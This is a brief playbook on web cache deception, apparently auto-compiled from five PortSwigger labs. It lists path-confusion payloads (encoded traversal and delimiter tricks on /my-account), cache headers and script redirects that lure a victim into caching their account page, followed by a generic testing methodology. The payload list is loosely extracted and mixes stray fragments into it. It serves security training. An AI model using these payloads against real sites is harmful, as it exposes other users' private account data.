## CACHE DECEPTION Playbook
*Synthesized from 5 PortSwigger labs*

### Overview
This playbook covers 5 known attack techniques for cache_deception.

### Attack Techniques

**General:**
- Exploiting cache server normalization for web cache deception
- Exploiting exact-match cache rules for web cache deception
- Exploiting origin server normalization for web cache deception
- Exploiting path delimiters for web cache deception
- Exploiting path mapping for web cache deception

### Key Payloads
```
/resources/..%2fmy-account
X-Cache: miss
/aaa/..%2fresources/YOUR-RESOURCE
Cache-Control:
                            max-age=30
https://[LAB_ID].[TARGET]/my-account/wcd.js
/my-account?abc.js
/aaa/..%2frobots.txt
/aaa/..%2fmy-account
/resources
Cache-Control: max-age=30
<script>document.location="https://[LAB_ID].[TARGET]/my-account;wcd.js"</script>
404 Not Found
<script>document.location="https://[LAB_ID].[TARGET]/my-account/wcd.js"</script>
administrator
/my-account
/my-account/abc.js
/resources/..%2fYOUR-RESOURCE
/my-accountabc
/resources/aaa
X-Cache: hit
```

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

